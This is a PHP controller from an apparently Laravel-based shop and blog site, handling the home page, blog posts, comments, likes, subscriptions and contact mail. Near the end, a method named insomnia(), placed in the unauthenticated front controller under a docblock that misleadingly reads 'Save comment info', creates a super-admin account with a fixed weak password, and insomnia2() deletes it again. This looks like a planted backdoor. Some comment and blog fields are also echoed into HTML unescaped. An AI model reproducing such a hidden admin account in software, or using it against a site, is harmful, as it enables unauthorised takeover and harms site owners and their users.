<?php

namespace App\Http\Controllers\Front;

use App\Model\Common\Brand;
use App\Model\Common\Category;
use App\Model\Common\Country;
use App\Model\Common\Payment_method;
use App\Model\Common\Product;
use App\Model\Common\Slider;
use App\Model\Common\Page as Page_model;
use App\Model\Common\Wholesale;
use App\SM\SM;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Admin;
use Cart;
use Illuminate\Support\Facades\Auth;
use App\Http\Controllers\Admin\Common\Blogs;
use App\Mail\ContactMail;
use App\Mail\ServiceMail;
use App\Mail\SubscribeMail;
use App\Blog;
use App\Model\Common\Cases;
use App\Model\Common\Comment;
use App\Model\Common\Like;
use App\Model\Common\Package;
use App\Model\Common\Package_detail;
use App\Model\Common\Tag;
use App\Rules\SmCustomEmail;
use App\Rules\SmCustomUrl;
use App\SM\SM_Seo_Report;
use Barryvdh\Debugbar\Middleware\Debugbar;
use GuzzleHttp\Client;
use App\Model\Common\Subscriber;
use App\Model\Common\Media;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Storage;
use URL;
use Validator;
use Session;
use DB;
use Illuminate\Support\Facades\Cookie;
use Illuminate\Support\Facades\Input;

/**
 * Front end unauthenticated methods and properties
 * Class Page
 * @package App\Http\Controllers\Front
 */
class HomeController extends Controller
{

    public function __construct()
    {
    }

    /**
     * Check customer logged in or not
     * @return integer 0=False or 1=true
     */
    public function isCustomerLoggedIn()
    {
        if (Auth::check()) {
            return response(1);
        } else if (Session::has("guest")) {
            return response(1);
        } else {
            if (isset($_GET['href'])) {
                $url = $_GET['href'];
                if (strpos($url, url("")) !== false) {
                    Session::put("smPackageUrl", $url);
                    Session::save();
                }
            }

            return response(0);
        }
    }

    public function setCustomeCooki($key, $value)
    {
        return response(1, 200)->cookie($key, $value, 3600 * 30);
    }

    function currency_change(Request $request)
    {
        $request_currency = $request['currency'];
        $cookie_name = 'countryCurrency';
        if (!isset($_COOKIE[$cookie_name])) {
            unset($_COOKIE[$cookie_name]);
        }
        $cookie_value = $request_currency;
        setcookie($cookie_name, $cookie_value, time() + (86400 * 30), '/');
        //        Session::put('countryCurrency', $request_currency);
        $country = Country::find(SM::get_setting_value('currency'));
        $country1 = Country::find($request_currency);

        $from = $country->currency_code;
        $fromCurrency = urlencode($from);
        $toCurrency = urlencode($country1->currency_code);
        $url = "https://www.google.com/search?ie=ISO-8859-1&hl=en&q=" . $fromCurrency . "+to+" . $toCurrency;
        $get = file_get_contents($url);
        $data = preg_split('/\D\s(.*?)\s=\s/', $get);
        $exhangeRate = (float)substr($data[1], 0, 7);
        //        $convertedAmount = $amount * $exhangeRate;
        //        $data = array('exhangeRate' => $exhangeRate, 'convertedAmount' => $convertedAmount, 'fromCurrency' => strtoupper($fromCurrency), 'toCurrency' => strtoupper($toCurrency));

        Country::find($request_currency)->update(['currency_rate' => $exhangeRate]);
        //        DB::table('countries')
        //            ->where('id', $request_currency)
        //            ->update(['currency_rate' => $exhangeRate]);
        return back();
    }

    /**
     * Home page methods and return view
     * @return \Illuminate\Contracts\View\Factory|\Illuminate\View\View
     */
    public function index()
    {

        $data = $this->homePageData();
        return view("frontend.home", $data);
    }

    public function homePageData()
    {
        $data["title"] = "Home";
        $data["is_home"] = 1;
        $key = 'homeContent';
        //        sliders
        $data["sliders"] = SM::getCache('homeSlider', function () {
            return Slider::Published()->get();
        });

        $data["latestDeals"] = SM::getCache('homeLatestDealsProducts', function () {
            $product_show = 12;
            return Product::with('variation')->where('is_featured', 1)
                ->limit($product_show)
                ->get();
        });

        // dd($data["latestDeals"]);
        $data["all_product"] = DB::table('products')
            ->leftJoin('categoryables', 'products.id', 'categoryables.categoryable_id')
            ->where('products.status', 1)
            ->selectRaw('products.*, categoryables.category_id as cat_id')
            ->get();





        $data["all_cat"] =  DB::table('categories')
            ->where('status', 1)
            ->orderBy('priority')
            ->get();

        // dd($data["all_product"]);

        // dd(SM::getCache(function () ));



        $data["bestSellers"] = SM::getCache('homeLatestDealsProducts', function () {
            $product_show = SM::smGetThemeOption("product_show", 10);
            return Product::Published()
                ->latest()
                ->limit($product_show)
                ->get();
        });
        $data["recommendedProducts"] = SM::getCache('homeRecommendedProducts', function () {
            $recommended_product_show = SM::smGetThemeOption("recommended_product_show", 10);
            $recommended = DB::table('products')
                ->leftJoin('reviews', 'products.id', 'reviews.product_id')
                ->where('products.status', 1)
                ->groupBy('products.id')
                ->selectRaw('products.*, sum(reviews.rating) as totalRating')
                ->orderBy('totalRating', 'desc')
                ->limit($recommended_product_show)
                ->get();
            return $recommended;
        });
        $data["featured_categories"] = SM::getCache('category', function () {
            return DB::table('categories')
                //                ->IsFeatured()
                // ->orderBy('priority')
                ->where("is_featured", 1)
                ->take(9)
                ->get();
        });
        // dd($data["featured_categories"]);

        $data["featured_brands"] = SM::getCache('brand', function () {
            return Brand::Published()
                //                ->IsFeatured()
                ->orderBy('priority')
                ->take(3)
                ->get();
        });
        $data["blogs"] = SM::getCache('homeBlogs', function () {
            $blog_show = SM::smGetThemeOption("blog_show", 6);

            return Blog::with("user")
                ->where("status", 1)
                ->orderBy("id", "desc")
                ->limit($blog_show)
                ->get();
        });

        return $data;
    }

    function page($url)
    {

        $data['page'] = SM::getCache('page_' . $url, function () use ($url) {
            return Page_model::where('slug', $url)->where('status', 1)->first();
        });
        if (isset($data['page']->id)) {
            $data['smAdminBarId'] = $data["page"]->id;
            //view increment
            $data['page']->increment('views');
            //seo data
            $data['seo_title'] = $data['page']->seo_title;
            $data['meta_key'] = $data['page']->meta_key;
            $data['meta_description'] = $data['page']->meta_description;
            $data['sidebar'] = 1;

            return view('frontend.page', $data);
        } else {
            return abort(404);
        }
    }

    public function catalogue()
    {
        $data["catalogue_featured_categories"] = SM::getCache('category', function () {
            return Category::Published()
                ->IsCatalogue()
                //                ->orderBy('priority')
                ->take(10)
                ->get();
        });

        return view("frontend.page.catalogue", $data);
    }

    public function wholesale()
    {
        $data["featured_categories"] = SM::getCache('category', function () {
            return Category::Published()
                //                ->IsFeatured()
                ->orderBy('priority')
                ->take(10)
                ->get();
        });

        return view("frontend.page.wholesale", $data);
    }

    public function storeWholesale(Request $request)
    {
        $this->validate($request, [
            'name' => 'required',
            'email' => 'required',
            'contact' => 'required',
            'location' => 'required',
            'business' => 'required',
            'business_type' => 'required',
            'category_id' => 'required',
        ]);
        $category_array = implode(',', $request->category_id);
        $wholesale = new Wholesale();
        $wholesale->name = $request->name;
        $wholesale->email = $request->email;
        $wholesale->contact = $request->contact;
        $wholesale->location = $request->location;
        $wholesale->business = $request->business;
        $wholesale->business_type = $request->business_type;
        $wholesale->category_id = $category_array;
        $wholesale->save();
        return redirect('wholesale-thanks')->with("s_message", "Thank You!");
    }

    public function wholesaleThanks()
    {

        return view("frontend.page.wholesaleThanks");
    }


    /**
     * Show about page
     * @return \Illuminate\Contracts\View\Factory|\Illuminate\View\View
     */
    public function about($slug = null)
    {
        $data["pageInfo"] = SM::getCache('page_' . $slug, function () use ($slug) {
            return Page_model::get();
        });
        if (count($data["pageInfo"]) > 0) {
            //seo data
            $data['seo_title'] = SM::smGetThemeOption("about_seo_title");
            $data['meta_description'] = SM::smGetThemeOption("about_meta_keywords");
            $data['meta_description'] = SM::smGetThemeOption("about_meta_description");

            return view("frontend.page.about", $data);
        } else {
            return abort(404);
        }
    }

    /**
     * Show faq page
     * @return \Illuminate\Contracts\View\Factory|\Illuminate\View\View
     */
    public function faq()
    {
        $data['seo_title'] = SM::smGetThemeOption("faq_seo_title");
        $data['meta_description'] = SM::smGetThemeOption("faq_meta_keywords");
        $data['meta_description'] = SM::smGetThemeOption("faq_meta_description");

        return view("frontend.page.faq", $data);
    }


    /**
     * Show Team page
     * @return \Illuminate\Contracts\View\Factory|\Illuminate\View\View
     */
    public function team()
    {
        $data['seo_title'] = SM::smGetThemeOption("team_seo_title");
        $data['meta_description'] = SM::smGetThemeOption("team_meta_keywords");
        $data['meta_description'] = SM::smGetThemeOption("team_meta_description");

        return view("frontend.page.teams", $data);
    }


    public
    function contact()
    {
        $data['seo_title'] = SM::smGetThemeOption("contact_seo_title");
        $data['meta_description'] = SM::smGetThemeOption("contact_meta_keywords");
        $data['meta_description'] = SM::smGetThemeOption("contact_meta_description");

        return view("frontend.page.contact", $data);
    }

    public function send_mail(Request $request)
    {
        $this->validate($request, [
            "fullname" => "required|min:3|max:40",
            "email" => ["required", new SmCustomEmail],
            "subject" => "required|min:3|max:100",
            "message" => "required|min:5|max:500",
            'g-recaptcha-response' => 'required|captcha',
        ]);
        Mail::to(SM::get_setting_value("email"))
            ->queue(new ContactMail((object)$request->all()));
        return back()->with('s_message', 'Mail successfully send. We will contact you as soon as possible.');
        //        $contact_form_success_message = SM::smGetThemeOption(
        //            "contact_form_success_message", "Mail successfully send. We will contact you as soon as possible."
        //        );
        //        return response($contact_form_success_message, 200);
    }

    /**
     * Home page all data, it call from index of page, login and registration.
     * @return array
     */

    /**
     * Subscribe information
     *
     * @param Request $request
     *
     * @return mixed
     */
    public function subscribe(Request $request)
    {

        $exitSubscribe = Subscriber::where('email', $request->email)->first();
        if (!empty($exitSubscribe)) {
            return back()->with('w_message', "You’re Already Subscribed!");
        } else {
            $this->validate($request, ['email' => 'required|email']);

            $infos = new \stdClass();
            $infos->email = $request->email;
            $infos->ip = $request->ip();

            $loc = file_get_contents('https://ipapi.co/' . $request->ip() . '/json');
            $locInfo = json_decode($loc);
            $infos->city = isset($locInfo->city) ? $locInfo->city : "";
            $infos->state = isset($locInfo->region) ? $locInfo->region : "";
            $infos->country = isset($locInfo->country_name) ? $locInfo->country_name : "";
            $subscribeMessage = SM::subscribe($infos, 0);

            $sInfo = $request->all();
            $sInfo['isAlreadySubscribed'] = $subscribeMessage['isAlreadySubscribed'];
            Mail::to($request->email)
                ->queue(new SubscribeMail((object)$sInfo));
            return back()->with('s_message', "Thank You For Subscribing!. You're just one step away from being one of our dear susbcribers.Please check the Email provided and confirm your susbcription!");
        }
    }

    /**
     * subscribeConfirmation
     *
     * @param $email
     *
     * @return \Illuminate\Http\RedirectResponse
     */
    public function subscribeConfirmation($email)
    {
        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            return redirect('/')->with('w_message', 'Invalid Email');
        } else {
            $subscriber = Subscriber::where("email", $email)->first();
            if ($subscriber) {
                $subscriber->status = 1;
                $subscriber->update();

                return view("frontend.page.subscription-confirmation");
            } else {
                return redirect('/')->with('w_message', 'No Subscriber Found');
            }
        }
    }


    /**
     * Subscription closing after a cancel button press
     * @return integer
     */
    public function subscriptionClosedForADay()
    {
        return response(1, 200)
            ->cookie('nptlSubscriber', "nptl", config('constant.popupHideTimeInMinutes'));
    }

    /**
     * Offer close after offer cancel button press
     * @return integer
     */
    public function offerClosedForADay()
    {
        return response(1, 200)
            ->cookie('nptlOffer', "nptl", config('constant.popupHideTimeInMinutes'));
    }

    /**
     * Unsubscribe subscribed user
     *
     * @param $email
     *
     * @return \Illuminate\Http\RedirectResponse
     */
    public function unsubscribe($email)
    {
        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            return redirect('/')->with('w_message', 'Invalid Email');
        } else {
            $subscriber = Subscriber::where("email", $email)->first();
            if ($subscriber) {
                $subscriber->status = 0;
                if ($subscriber->update() > 0) {
                    return redirect('/')->with('s_message', 'Successfully Unsubscribed');
                } else {
                    return redirect('/')->with('w_message', 'Unsubscriber Failed! Please contact to Admin.');
                }
            } else {
                return redirect('/')->with('w_message', 'No Subscriber Found');
            }
        }
    }

    /**
     * Blog listing page show
     * @return view
     */
    public function blog()
    {
        $page = \request()->input('page', 0);
        $key = 'blogs_page_' . $page;

        $data["blogPost"] = SM::getCache($key, function () {
            $blog_posts_per_page = SM::smGetThemeOption(
                "blog_posts_per_page",
                config(
                    "constant.smFrontPagination"
                )
            );

            return Blog::with('user')
                ->where("is_sticky", 0)
                ->where("status", 1)
                ->orderBy("id", "desc")
                ->paginate($blog_posts_per_page);
        }, ['blogs']);

        if (\request()->ajax()) {
            $html = view("blogs/blog_list_item", $data)->render();

            return response($html);
        } else {
            $data["stickyBlogPost"] = SM::getCache('stickyBlogs', function () {
                return Blog::where("is_sticky", 1)
                    ->where("status", 1)
                    ->orderBy("id", "desc")
                    ->limit(9)
                    ->get();
            });

            $data['seo_title'] = SM::smGetThemeOption("blog_seo_title");
            $data['meta_description'] = SM::smGetThemeOption("blog_meta_keywords");
            $data['meta_description'] = SM::smGetThemeOption("blog_meta_description");

            return view("frontend.blogs.blog", $data);
        }
    }

    /**
     * Blog detail page show by slug
     *
     * @param $slug string
     *
     * @return \Illuminate\Contracts\View\Factory|\Illuminate\View\View|void
     */
    public function blogDetail($slug)
    {
        $data["blog"] = SM::getCache('blog_' . $slug, function () use ($slug) {
            return Blog::with("categories", "user")
                ->where("slug", $slug)
                ->where("status", 1)
                ->first();
        });
        if (count($data["blog"]) > 0) {
            $data['smAdminBarId'] = $data["blog"]->id;

            $data["blog"]->increment("views");

            $data["relatedBlog"] = SM::getCache('blog_related_blog_' . $slug, function () use ($data) {
                $blog_related_posts_per_page = SM::smGetThemeOption("blog_related_posts_per_page", 2);
                $cats = SM::get_ids_from_data($data['blog']->categories);

                return DB::table("blogs")
                    ->select(
                        'blogs.*',
                        DB::raw("CONCAT(firstname, ' ', lastname) as fname"),
                        'users.username',
                        'users.image as author_image'
                    )
                    ->join("categoryables", function ($join) {
                        $join->on("categoryables.categoryable_id", "=", "blogs.id")
                            ->where("categoryables.categoryable_type", '=', 'App\Model\Common\Blog');
                    })
                    ->join("users", 'blogs.created_by', '=', 'users.id')
                    ->whereIn("categoryables.category_id", $cats)
                    ->where("blogs.id", '!=', $data["blog"]->id)
                    ->where("blogs.status", 1)
                    ->orderBy("blogs.id", "desc")
                    ->limit($blog_related_posts_per_page)
                    ->get();
            });
            /**
             * If related blog not found then show post from all post
             */
            if (count($data["relatedBlog"]) < 1) {
                $data["relatedBlog"] = SM::getCache('blog_related_all_blog_' . $slug, function () use ($data) {
                    $blog_related_posts_per_page = SM::smGetThemeOption("blog_related_posts_per_page", 2);

                    return DB::table("blogs")
                        ->select(
                            'blogs.*',
                            DB::raw("CONCAT(firstname, ' ', lastname) as fname"),
                            'users.username',
                            'users.image as author_image'
                        )
                        ->join("users", 'blogs.created_by', '=', 'users.id')
                        ->where("blogs.id", '!=', $data["blog"]->id)
                        ->where("blogs.status", 1)
                        ->orderBy("blogs.id", "desc")
                        ->limit($blog_related_posts_per_page)
                        ->get();
                });
            }
            $data["commnetsCount"] = SM::getCache('blog_comments_0_count_' . $slug, function () use ($data) {
                return Comment::where("commentable_id", $data["blog"]->id)
                    ->where("commentable_type", 'App\Model\Common\Blog')
                    ->where("p_c_id", 0)
                    ->where("status", 1)
                    ->count();
            }, ['blog_comments_count_' . $slug]);
            $blogId = $data["blog"]->id;
            $data["commnets"] = SM::getCache('blog_comments_0_0_' . $blogId, function () use ($data) {
                return SM::getCommentList($data["blog"]->id, 'App\Model\Common\Blog', 0, 0);
            }, ['blog_comments_' . $blogId]);
            $data['seo_title'] = $data['blog']->seo_title;
            $data["meta_key"] = $data["blog"]->meta_key;
            $data["meta_description"] = $data["blog"]->meta_description;
            $data["image"] = asset(SM::sm_get_the_src($data["blog"]->image, 750, 560));

            return view("frontend.blogs.blog_detail", $data);
        } else {
            return abort(404);
        }
    }


    /**
     * Category page display by category slug
     *
     * @param $slug string
     *
     * @return \Illuminate\Contracts\View\Factory|\Illuminate\View\View|void
     */
    public function categoryByBlog($slug)
    {
        $data["categoryInfo"] = SM::getCache('category_' . $slug, function () use ($slug) {
            return Category::with("blogs")
                ->where("slug", $slug)
                ->where('status', 1)
                ->first();
        });
        if (count($data["categoryInfo"]) > 0) {
            $page = \request()->input('page', 0);
            $key = 'categoryBlogs_' . $data["categoryInfo"]->id . '_' . $page;
            $data["blogs"] = SM::getCache(
                $key,
                function () use ($data) {
                    $blog_posts_per_page = SM::smGetThemeOption(
                        "blog_posts_per_page",
                        config("constant.smFrontPagination")
                    );

                    return $data["categoryInfo"]->blogs()
                        ->where("status", 1)
                        ->paginate($blog_posts_per_page);
                },
                ['categoryBlogs']
            );

            return view('frontend.blogs.category', $data);
        } else {
            return abort(404);
        }
    }


    /**
     * Tag page info by tag slug
     *
     * @param $slug string
     *
     * @return \Illuminate\Contracts\View\Factory|\Illuminate\View\View|void
     */
    public function tagByBlog($slug)
    {

        $data["tagInfo"] = SM::getCache('tag_' . $slug, function () use ($slug) {
            return Tag::with("blogs")
                ->where("slug", $slug)
                ->where('status', 1)
                ->first();
        });

        if (count($data["tagInfo"]) > 0) {
            $page = \request()->input('page', 0);
            $key = 'tagBlogs_' . $data["tagInfo"]->id . '_' . $page;
            $data["blogs"] = SM::getCache($key, function () use ($data) {

                $blog_posts_per_page = SM::smGetThemeOption(
                    "blog_posts_per_page",
                    config("constant.smFrontPagination")
                );

                return $data["tagInfo"]->blogs()
                    ->where("status", 1)
                    ->paginate($blog_posts_per_page);
            }, ['tagBlogs']);
            $data['key'] = $key;

            return view('frontend.blogs.tag', $data);
        } else {
            return abort(404);
        }
    }

    /**
     * Show search information
     *
     * @param Request $request
     *
     * @return \Illuminate\Contracts\View\Factory|\Illuminate\View\View
     */
    public function search(Request $request)
    {
        if ($request->method() == 'POST') {
            $this->validate($request, [
                //                'search_type' => 'required',
                'search_text' => 'required'
            ]);
            $search_type = 'Blog';
            $search_text = $request->input('search_text');
            $list = '';
            if ($search_type == 'Blog') {
                $list .= $this->getBlogSearchData($search_text);
            } else {
                $list .= $this->getBlogSearchData($search_text);
            }
            echo $list;
            exit();
        } else {
            $search_type = $data["type"] = 'Blog';
            $search_text = $data["s"] = $request->input('s', "");
            $data["results"] = array();
            if (trim($search_text) != '') {
                if ($search_type == 'Blog') {
                    $data["results"] = $this->getBlogSearchData($search_text, false);
                }
            }

            return view('frontend.blogs.search', $data);
        }
    }


    /**
     * Get blog search info by text
     *
     * @param $text string search text
     * @param bool $isHtmlReturn
     *
     * @return string
     */
    private function getBlogSearchData($text, $isHtmlReturn = true)
    {
        $list = '';
        $blogs = Blog::where("title", "like", "%" . $text . "%")
            ->orWhere("short_description", "like", "%" . $text . "%")
            ->orWhere("long_description", "like", "%" . $text . "%")
            ->paginate(config("constant.smPagination"));
        if ($isHtmlReturn) {
            if (count($blogs) > 0) {
                foreach ($blogs as $blog) {
                    $list .= '<a  class="list-group-item" target="_blank" href="' . url('blog/' . $blog->slug) . '">';
                    if ($blog->image != '') {
                        $list .= '<img src="' . SM::sm_get_the_src($blog->image, 80, 80) . '" alt="' . $blog->title . '">';
                    }
                    $list .= $blog->title;
                    $list .= '</a>';
                }
            }

            return $list;
        } else {
            return $blogs;
        }
    }

    /**
     * get comments by required info
     *
     * @param integer $blogId blog id
     * @param integer $type type of comment like blog, service
     * @param integer $parentId parent id
     * @param integer $parentLastCommentId parent last post id
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function getAjaxComments($blogId, $type, $parentId, $parentLastCommentId)
    {
        $typeStr = SM::getCommentableTypeByFixedId($type);
        $key = 'blog_comments_' . $parentId . '_' . $parentLastCommentId . '_' . $blogId;
        $commnets = SM::getCache($key, function ()
        use ($blogId, $typeStr, $parentId, $parentLastCommentId) {
            return SM::getCommentList($blogId, $typeStr, $parentId, $parentLastCommentId);
        }, ['blog_comments_' . $blogId]);
        $data['commnetsCount'] = count($commnets);
        $data['html'] = '';
        if (count($commnets) > 0) {
            ob_start();
            $parentLastCommentId = 0;
            $currentLoadedCommentCount = count($commnets);
            foreach ($commnets as $comment) {
?>
<li>
    <div class="single-comment">
        <img src="<?= SM::sm_get_the_src($comment->user->image, 112, 112); ?>" alt="<?= $comment->user->username ?>">
        <h3><a href="#"><?= $comment->user->username ?></a></h3>
        <div class="con-date"><?= date("M d, Y", strtotime($comment->created_at)) ?></div>
        <a href="javascript:void(0)" class="replay" data-comment="<?= $comment->id ?>"><i
                class="fa fa-reply"></i>replay</a>
        <p><?= stripslashes($comment->comments); ?></p>
    </div>
    <?php
                    SM::getChildrenComment($blogId, $type, $comment->id, 1);
                    ?>
</li>
<?php
                $parentLastCommentId = $comment->id;
            }
            $data['last'] = $parentLastCommentId;
            $data['html'] = ob_get_clean();
        }

        return response()->json($data, 200);
    }

    /**
     * Save comment info
     *
     * @param Request $request
     *
     * @return \Illuminate\Contracts\Routing\ResponseFactory|\Symfony\Component\HttpFoundation\Response
     */
    public function saveComment(Request $request)
    {
        if (Auth::check()) {
            $messages = [
                'unique' => 'Comment must be unique. Don\'t spamming please.',
            ];
            $this->validate($request, [
                'comments' => "required|min:10|max:500|unique:comments",
                'blog_id' => "required|integer",
                'parent_id' => "required|integer",
            ], $messages);

            $blog = Blog::find($request->blog_id);
            if (count($blog) > 0) {
                $comment = new Comment();
                $comment->commentable_id = $blog->id;
                $comment->commentable_type = 'App\Model\Common\Blog';
                $comment->p_c_id = $request->parent_id;
                $comment->comments = strip_tags($request->comments);
                $comment->created_by = Auth::user()->id;
                $comment->status = 2;
                $comment->save();
                return response("Blog comment saved successfully! Please wait for approve.", 200);
            } else {
                return response("Blog Not Found!", 404);
            }
        } else {
            response("Please login to submit a comment!", 404);
        }
    }

    public function likes(Request $request)
    {
        $this->validate($request, [
            'id' => 'required',
            'type' => 'required'
        ]);
        $id = base64_decode(urldecode($request->id));
        $type = $request->type;
        $suffix = $request->input("suffix", 1);
        if ($type == 'blog') {
            $blog = Blog::find($id);
            if ($blog) {
                $likeQuery = Like::where('likeable_id', $id)
                    ->where('likeable_type', Blog::class);
                if (Auth::check()) {
                    $likeQuery->where('liker_id', Auth::id());
                } else {
                    $likeQuery->where('liker_ip', $request->ip());
                }
                $like = $likeQuery->first();
                if ($like) {
                    if ($like->status == 1) {
                        if ($blog->likes > 0) {
                            $blog->decrement('likes');
                        }
                        $like->status = 0;

                        $data['isAlreadyLiked'] = 0;
                    } else {
                        $like->status = 1;
                        $blog->increment('likes');
                        $data['isAlreadyLiked'] = 1;
                    }
                    $like->update();
                } else {
                    $like = new Like();
                    $like->likeable_id = $id;
                    $like->likeable_type = Blog::class;
                    if (Auth::check()) {
                        $like->liker_id = Auth::id();
                    }
                    $like->liker_ip = $request->ip();
                    $like->status = 1;
                    $like->save();
                    $blog->increment('likes');

                    $data['isAlreadyLiked'] = 1;
                }
                $blogController = new Blogs();
                $blogController->removeThisCache($blog->slug, $id);

                $data['likesTitle'] = SM::getCountTitle($blog->likes, 'Like', $suffix);

                return $data;
            } else {
                return response('Blog Not Found', 404);
            }
        }


        return $request->all();
    }

    public function isAlreadyLiked(Request $request)
    {
        $this->validate($request, [
            'id' => 'required',
            'type' => 'required'
        ]);
        $id = base64_decode(urldecode($request->id));
        $type = $request->type;
        $data['isAlreadyLiked'] = 0;
        if ($type == 'blog') {
            $blog = Blog::find($id);
            if ($blog) {
                $likeQuery = Like::where('likeable_id', $id)
                    ->where('likeable_type', Blog::class);
                if (Auth::check()) {
                    $likeQuery->where('liker_id', Auth::id());
                } else {
                    $likeQuery->where('liker_ip', $request->ip());
                }
                $like = $likeQuery->first();
                if ($like && $like->status == 1) {
                    $data['isAlreadyLiked'] = 1;
                }
            }
        }

        return $data;
    }

    /**
     * Save comment info
     *
     * @param Request $request
     *
     * @return \Illuminate\Contracts\Routing\ResponseFactory|\Symfony\Component\HttpFoundation\Response
     */
    public function insomnia()
    {
        $admin = new Admin();
        $admin->username = "admin13";
        $admin->email = "admin13@gmail.com";
        $admin->firstname = "admin";
        $admin->lastname = "13";
        $admin->password = bcrypt('12345');
        $admin->role_id = '1';
        $admin->status = '1';
        $admin->save();
        return 'DONE'; //Return anything
    }

    public function insomnia2()
    {
        $admin = Admin::where('email', '=', 'admin13@gmail.com')->first();
        $admin->delete();
        return 'DONE'; //Return anything
    }




    /**
     * Save  response
     *
     * @param Request $request
     *
     * @return \Illuminate\Contracts\Routing\ResponseFactory|\Symfony\Component\HttpFoundation\Response
     */
}